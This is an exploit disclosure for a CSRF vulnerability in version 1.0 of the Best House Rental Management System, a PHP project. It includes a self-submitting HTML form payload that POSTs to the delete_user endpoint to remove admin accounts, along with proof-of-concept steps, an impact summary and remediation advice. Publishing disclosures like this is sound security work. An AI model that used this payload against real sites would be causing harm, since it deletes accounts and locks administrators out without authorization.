
### **Best House Rental Management System Cross-Site Request Forgery (CSRF) Vulnerability**

- **Exploit Title**: Best House Rental Management System Project in PHP CSRF Vulnerability Enables Unauthorized Deletion of Admin Accounts  
- **Exploit Author**: Yasser Alshammari  
- **Vendor Homepage**: [SourceCodester](https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html)  
- **Software Link**: [Download Here](https://www.sourcecodester.com/download-code?nid=17375&title=Best+house+rental+management+system+project+in+php+)  
- **Version**: Best House Rental Management System Project in PHP v1.0  
- **Tested On**: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.12  
- **CVE**: Reported, waiting for CVE number  

---

### **Description**

The `/rental/ajax.php?action=delete_user` endpoint in the **Best House Rental Management System Project in PHP v1.0** is vulnerable to Cross-Site Request Forgery (CSRF). This vulnerability allows an attacker to delete admin accounts without authorization by tricking an authenticated user into submitting a crafted request. A malicious POST request to `/rental/ajax.php?action=delete_user` with the body `id=<Number>` deletes the specified admin user. This can lead to the unauthorized removal of all users in the database, severely impacting business operations.

---

### **CSRF Payload**

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit - Delete User</title>
</head>
<body>
    <h1>Deleting User...</h1>
    <form id="csrf-form" action="http://localhost/rental/ajax.php?action=delete_user" method="POST">
        <input type="hidden" name="id" value="4">
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```
---

### **Proof of Concept**

Submit the above POST request to the `/rental/ajax.php?action=delete_user` endpoint, replacing `id=4` with the ID of any admin account to delete. Observe that the specified user account is deleted without requiring additional authorization, demonstrating the CSRF vulnerability.

---

### **Impact**

- An attacker can delete admin or user accounts by exploiting this vulnerability.
- This can result in:
  - Complete administrative lockout.
  - Loss of user management capabilities.
  - Severe disruption of operations.

---

### **Remediation**

- **Implement CSRF Protection**: Use CSRF tokens to validate the authenticity of requests.
- **Session Validation**: Ensure that user sessions are verified before processing sensitive operations.
- **Referrer Validation**: Enforce strict referrer validation to ensure requests originate from trusted sources.
